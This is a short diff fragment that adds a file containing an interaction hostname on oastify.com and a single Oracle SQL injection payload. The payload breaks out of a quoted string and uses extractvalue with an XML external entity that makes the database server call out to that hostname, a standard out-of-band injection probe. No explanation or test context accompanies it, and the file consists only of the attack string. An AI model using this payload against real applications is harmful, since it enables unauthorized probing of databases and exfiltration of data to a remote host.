@@ -1,0 +1,5 @@
+
+
+xlmpvyfqp5qkesf3ttaeyy7il9r0fq3f.oastify.com
+
+' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://xlmpvyfqp5qkesf3ttaeyy7il9r0fq3f.oastify.com"> %remote;]>'),'/l') FROM dual)--
